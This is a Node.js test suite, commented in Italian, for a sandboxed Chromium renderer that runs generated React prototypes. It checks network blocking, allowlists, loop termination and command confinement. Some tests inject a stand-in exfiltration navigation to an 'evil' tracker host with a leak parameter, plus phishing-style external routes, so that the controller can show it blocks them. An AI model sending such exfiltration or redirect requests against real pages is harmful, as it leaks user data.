import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, rmSync, mkdtempSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import {
	resolveLabChromium,
	detectChromiumPlatform,
	createLabRendererController,
	LabRendererController,
	PINNED_CHROMIUM_VERSION,
	LAB_VIRTUAL_ORIGIN
} from '../src/lib/lab/renderer.ts';
import { compileLabPrototype } from '../src/lib/lab/compiler.ts';
import {
	LAB_NETWORK_POLICY_BLOCKED,
	parseLabRendererCommand,
	type LabNetworkPolicy,
	type LabRendererCommand
} from '../src/lib/lab/contracts.ts';

describe('Laboratorio prototipi — Step 9: Renderer Chromium gestito e policy di rete', () => {
	// --------------------------------------------------------------------------
	// 1. Risoluzione binario Chromium gestito e versionato
	// --------------------------------------------------------------------------
	describe('1. Risoluzione binario Chromium e profilo dedicato', () => {
		it('rileva la piattaforma Chromium supportata', () => {
			const platform = detectChromiumPlatform();
			assert.notEqual(platform, null, 'La piattaforma corrente deve essere supportata');
			assert.match(platform!, /^(win64|win32|mac-arm64|mac-x64|linux64)$/);
		});

		it('risolve e riusa un binario Chromium compatibile dalla cache locale senza riscaricare', async () => {
			const resolved = await resolveLabChromium();
			assert.ok(resolved.executablePath, 'Deve restituire un percorso eseguibile valido');
			assert.equal(existsSync(resolved.executablePath), true, 'Il file eseguibile deve esistere su disco');
			assert.ok(['cache', 'env', 'system', 'download', 'explicit'].includes(resolved.source));
			assert.ok(resolved.version, 'Deve riportare una versione');
		});

		it('onora un percorso esplicito o da variabile d ambiente se esistente', async () => {
			const existing = await resolveLabChromium();
			const explicit = await resolveLabChromium({ executablePath: existing.executablePath });
			assert.equal(explicit.executablePath, existing.executablePath);
			assert.equal(explicit.source, 'explicit');
		});

		it('crea un profilo dedicato temporaneo e non tocca il profilo utente', async () => {
			const customProfile = join(tmpdir(), `test-lab-profile-${Date.now()}`);
			const controller = new LabRendererController({ userDataDir: customProfile });

			assert.equal(controller.isClosed(), false);
			assert.equal(controller.getNetworkPolicy().mode, 'blocked');
			assert.equal(controller.getBlockedRequests().length, 0);

			// Non deve coincidere con il profilo predefinito dell'utente
			assert.equal(/Google\\Chrome\\User Data|Google\/Chrome\/User Data/.test(customProfile), false);

			rmSync(customProfile, { recursive: true, force: true });
		});
	});

	// --------------------------------------------------------------------------
	// 2. Avvio del renderer e ciclo di rendering di un prototipo reale
	// --------------------------------------------------------------------------
	describe('2. Avvio renderer, rendering React 19 + Tailwind v4 e isolamento Tauri', () => {
		it('avvia Chromium, si connette a CDP e renderizza un prototipo React compilato', async () => {
			// Compila un componente React con lo Step 8
			const compiled = await compileLabPrototype({
				files: {
					'/src/main.tsx': `
						import React from 'react';
						import { createRoot } from 'react-dom/client';
						import App from './App';
						createRoot(document.getElementById('root')).render(<App />);
					`,
					'/src/App.tsx': `
						import React, { useState } from 'react';
						export default function App() {
							const [count, setCount] = useState(42);
							return (
								<main className="p-4 bg-slate-100 text-slate-800">
									<h1 id="title" className="text-xl font-bold">Prototipo Laboratorio</h1>
									<p id="counter">Valore: {count}</p>
								</main>
							);
						}
					`
				}
			});

			assert.equal(compiled.ok, true, 'La compilazione deve riuscire');
			assert.ok(compiled.js, 'Deve produrre codice JavaScript');

			const notifications: any[] = [];
			const controller = await createLabRendererController({
				onNotification: (n) => notifications.push(n)
			});

			try {
				assert.ok(controller.getTargetId(), 'Deve avere un target id attivo');
				assert.ok(controller.getSessionId(), 'Deve avere una sessione CDP attiva');
				assert.ok(controller.getWsUrl()?.startsWith('ws://127.0.0.1:'), 'WebSocket su loopback');

				// Renderizza la revisione
				await controller.renderRevision('rev-step9-initial', {
					js: compiled.js!,
					css: compiled.css || '',
					title: 'Prototipo Step 9'
				});

				assert.equal(controller.getObservedRevisionId(), 'rev-step9-initial');
				assert.equal(notifications.length >= 1, true);
				assert.equal(notifications[0].type, 'navigation_state');
				assert.equal(notifications[0].revisionId, 'rev-step9-initial');

				// Verifica responsivita'
				const responsive = await controller.isResponsive();
				assert.equal(responsive, true, 'Il renderer deve essere responsivo');

				// Verifica isolamento Tauri: window.__TAURI__ deve essere undefined
				const tauriAbsent = await controller.verifyTauriIpcAbsent();
				assert.equal(tauriAbsent, true, 'Il documento generato non deve ricevere IPC Tauri');

				// Ispeziona l'elemento renderizzato
				const inspected = await controller.getInspectedElementBySelector('#title');
				assert.ok(inspected, 'Deve trovare l elemento #title nel DOM');
				assert.equal(inspected!.tagName, 'h1');
				assert.equal(inspected!.textSnippet, 'Prototipo Laboratorio');
			} finally {
				await controller.close();
				assert.equal(controller.isClosed(), true);
			}
		});
	});

	// --------------------------------------------------------------------------
	// 3. Policy di rete nel controller: allowlist e blocco navigazioni esterne
	// --------------------------------------------------------------------------
	describe('3. Policy di rete nel controller: blocco location.href e allowlist', () => {
		it('intercetta e blocca tentativi di navigazione esterna via location.href (BlockedByClient)', async () => {
			const securityEvents: any[] = [];
			const controller = await createLabRendererController({
				initialPolicy: LAB_NETWORK_POLICY_BLOCKED,
				onSecurityEvent: (e) => securityEvents.push(e)
			});

			try {
				// Carica un prototipo minimale
				await controller.renderRevision('rev-nav-test', {
					js: `
						document.getElementById('root').innerHTML = '<button id="btn">Click me</button>';
					`,
					title: 'Test Navigazione'
				});

				// Tenta di navigare verso un dominio esterno malevolo tramite location.href nel documento
				// Invochiamo un click o un comando che tenta la navigazione
				const sessionId = controller.getSessionId();
				assert.ok(sessionId);

				// Innesca la navigazione esterna all'interno della pagina
				// Il controller deve intercettarla con Fetch.requestPaused e bloccarla
				const evalPromise = (controller as any).send(
					'Runtime.evaluate',
					{
						expression: 'location.href = "https://evil-external-tracker.example.com/exfiltrate?leak=data";'
					},
					sessionId
				);

				await evalPromise;

				// Attende che l'evento di rete venga processato dal controller
				await new Promise((r) => setTimeout(r, 400));

				const blocked = controller.getBlockedRequests();
				assert.equal(blocked.length >= 1, true, 'Deve registrare almeno una richiesta bloccata');
				assert.equal(blocked[0].url.startsWith('https://evil-external-tracker.example.com'), true);
				assert.equal(blocked[0].reason, 'blocked_mode');

				// Verifica che sia stato emesso l'evento di sicurezza
				const netEvent = securityEvents.find((e) => e.type === 'network_blocked');
				assert.ok(netEvent, 'Deve emettere un security event di tipo network_blocked');
				assert.equal(netEvent.url.startsWith('https://evil-external-tracker.example.com'), true);

				// Il renderer deve rimanere integro e responsivo
				assert.equal(await controller.isResponsive(), true);
			} finally {
				await controller.close();
			}
		});

		it('rispetta la modalita allowlist autorizzando solo le origini esplicite', async () => {
			const securityEvents: any[] = [];
			const policy: LabNetworkPolicy = {
				mode: 'allowlist',
				allowedOrigins: ['https://api.simulated-partner.com']
			};

			const controller = await createLabRendererController({
				initialPolicy: policy,
				onSecurityEvent: (e) => securityEvents.push(e)
			});

			try {
				await controller.renderRevision('rev-allowlist-test', {
					js: "document.getElementById('root').innerHTML = '<p>Allowlist Test</p>';",
					title: 'Allowlist Test'
				});

				const sessionId = controller.getSessionId()!;

				// 1. Origine non autorizzata via location.href -> deve essere bloccata
				await (controller as any).send(
					'Runtime.evaluate',
					{
						expression: 'location.href = "https://unauthorized-origin.com/data";'
					},
					sessionId
				);

				await new Promise((r) => setTimeout(r, 400));

				const blocked = controller.getBlockedRequests();
				assert.equal(blocked.length >= 1, true, 'L origine non autorizzata deve essere bloccata');
				assert.equal(blocked[0].url.startsWith('https://unauthorized-origin.com'), true);
				assert.equal(blocked[0].reason, 'origin_not_in_allowlist');

				// 2. Modifica dinamica della policy tramite comando tipizzato
				const cmdResult = await controller.executeCommand({
					type: 'set_network_policy',
					revisionId: 'rev-allowlist-test',
					policy: LAB_NETWORK_POLICY_BLOCKED
				});

				assert.equal(cmdResult.ok, true);
				assert.equal(controller.getNetworkPolicy().mode, 'blocked');
			} finally {
				await controller.close();
			}
		});
	});

	// --------------------------------------------------------------------------
	// 4. Budget di risorse, recupero da loop infinito e riciclo del target
	// --------------------------------------------------------------------------
	describe('4. Watchdog, recupero da ciclo infinito e riciclo target senza fermare il principale', () => {
		it('interrompe istantaneamente un ciclo infinito (while(true)) e recupera la responsivita', async () => {
			const securityEvents: any[] = [];
			const controller = await createLabRendererController({
				onSecurityEvent: (e) => securityEvents.push(e)
			});

			try {
				await controller.renderRevision('rev-loop-test', {
					js: "document.getElementById('root').innerHTML = '<p>Loop Test</p>';",
					title: 'Loop Test'
				});

				const sessionId = controller.getSessionId()!;

				// Avvia un loop infinito bloccante nella pagina
				let loopError: any = null;
				(controller as any)
					.send(
						'Runtime.evaluate',
						{
							expression: 'var loopCount = 0; while (true) { loopCount++; }'
						},
						sessionId
					)
					.catch((err: any) => {
						loopError = err;
					});

				// Breve pausa per permettere al ciclo di occupare il thread
				await new Promise((r) => setTimeout(r, 150));

				// Interrompe l'esecuzione tramite terminateExecution
				const termStart = performance.now();
				const terminated = await controller.terminateExecution();
				const termDuration = performance.now() - termStart;

				assert.equal(terminated, true, 'terminateExecution deve avere successo');
				assert.equal(termDuration < 1000, true, `La terminazione deve avvenire in millisecondi (impiegati ${termDuration.toFixed(1)} ms)`);

				// Attende che l'eccezione dell'evaluate si stabilizzi
				await new Promise((r) => setTimeout(r, 100));
				assert.ok(loopError, 'Il loop interrotto deve sollevare un errore di terminazione');

				// Verifica evento di sicurezza registrato
				const termEvent = securityEvents.find((e) => e.type === 'execution_terminated');
				assert.ok(termEvent, 'Deve emettere l evento di sicurezza execution_terminated');

				// VERIFICA CRUCIALE: Il renderer deve essere immediatamente responsivo e riutilizzabile
				const responsive = await controller.isResponsive();
				assert.equal(responsive, true, 'Il renderer deve essere di nuovo responsivo dopo l interruzione');
			} finally {
				await controller.close();
			}
		});

		it('ricicla il target con Target.closeTarget e Target.createTarget senza fermare il processo principale', async () => {
			const controller = await createLabRendererController();

			try {
				await controller.renderRevision('rev-recycle-test', {
					js: "document.getElementById('root').innerHTML = '<p>Prima del riciclo</p>';",
					title: 'Prima'
				});

				const initialTargetId = controller.getTargetId();
				assert.ok(initialTargetId);

				// Simula il processo principale di Studio che continua a eseguire lavoro
				let mainProcessActive = true;
				const mainHeartbeat = setInterval(() => {
					if (mainProcessActive) {
						// Battito del principale
					}
				}, 20);

				// Esegue il riciclo del target
				const newTargetId = await controller.recycleTarget('Test di riciclo programmato');
				assert.ok(newTargetId);
				assert.notEqual(newTargetId, initialTargetId, 'Il nuovo targetId deve essere diverso da quello precedente');
				assert.equal(controller.getTargetId(), newTargetId);

				// Verifica continuita' del principale
				assert.equal(mainProcessActive, true, 'Il processo principale non deve essere stato interrotto');
				clearInterval(mainHeartbeat);

				// Carica una nuova revisione nel nuovo target
				await controller.renderRevision('rev-recycle-test-2', {
					js: "document.getElementById('root').innerHTML = '<h2 id=\"fresh\">Dopo il riciclo</h2>';",
					title: 'Dopo'
				});

				const inspected = await controller.getInspectedElementBySelector('#fresh');
				assert.ok(inspected, 'Il nuovo target deve essere perfettamente operativo');
				assert.equal(inspected!.textSnippet, 'Dopo il riciclo');
			} finally {
				await controller.close();
			}
		});
	});

	// --------------------------------------------------------------------------
	// 5. Confinamento e comandi tipizzati: nessun browser generico per il modello
	// --------------------------------------------------------------------------
	describe('5. Confinamento comandi tipizzati e rifiuto operazioni fuori contratto', () => {
		let controller: LabRendererController;

		before(async () => {
			controller = await createLabRendererController();
		});

		after(async () => {
			if (controller) await controller.close();
		});

		it('rifiuta comandi con revisione non osservata o obsoleta', async () => {
			await controller.renderRevision('rev-active', {
				js: "document.getElementById('root').innerHTML = '<p>Active</p>';",
				title: 'Active'
			});

			// Comando legato a una revisione precedente
			const staleCmd: LabRendererCommand = {
				type: 'reload',
				revisionId: 'rev-stale',
				hard: true
			};

			const res = await controller.executeCommand(staleCmd);
			assert.equal(res.ok, false);
			assert.match(res.error!, /revisione 'rev-stale' ma e' osservata 'rev-active'/);
		});

		it('rifiuta navigazioni fuori dal prototipo come URL esterni o protocol-relative', async () => {
			await controller.renderRevision('rev-safe-nav', {
				js: "document.getElementById('root').innerHTML = '<p>Safe</p>';",
				title: 'Safe'
			});

			// 1. URL esterno rifiutato a monte dal parsing contrattuale
			const externalCmd = {
				type: 'navigate',
				revisionId: 'rev-safe-nav',
				route: 'https://evil.com/phishing'
			};
			const parsed = parseLabRendererCommand(externalCmd);
			assert.equal(parsed, null, 'Un URL esterno non deve superare parseLabRendererCommand');

			const res = await controller.executeCommand(externalCmd as any);
			assert.equal(res.ok, false);

			// 2. Protocol-relative rifiutato
			const protoRelCmd = {
				type: 'navigate',
				revisionId: 'rev-safe-nav',
				route: '//evil.com'
			};
			assert.equal(parseLabRendererCommand(protoRelCmd), null);

			// 3. Rotta interna valida accettata
			const internalCmd: LabRendererCommand = {
				type: 'navigate',
				revisionId: 'rev-safe-nav',
				route: '/passo/2'
			};
			const validParsed = parseLabRendererCommand(internalCmd);
			assert.notEqual(validParsed, null);
			const validRes = await controller.executeCommand(internalCmd);
			assert.equal(validRes.ok, true);
		});

		it('cattura screenshot del viewport in base64 PNG', async () => {
			await controller.renderRevision('rev-capture-test', {
				js: "document.getElementById('root').innerHTML = '<div style=\"padding:20px;background:#4f46e5;color:white;\">Cattura</div>';",
				title: 'Screenshot'
			});

			const captureRes = await controller.executeCommand({
				type: 'capture',
				revisionId: 'rev-capture-test',
				target: 'viewport'
			});

			assert.equal(captureRes.ok, true);
			assert.ok(typeof captureRes.data === 'string', 'I dati devono essere una stringa base64');
			assert.ok((captureRes.data as string).length > 100, 'Lo screenshot deve contenere byte immagine');
		});
	});
});
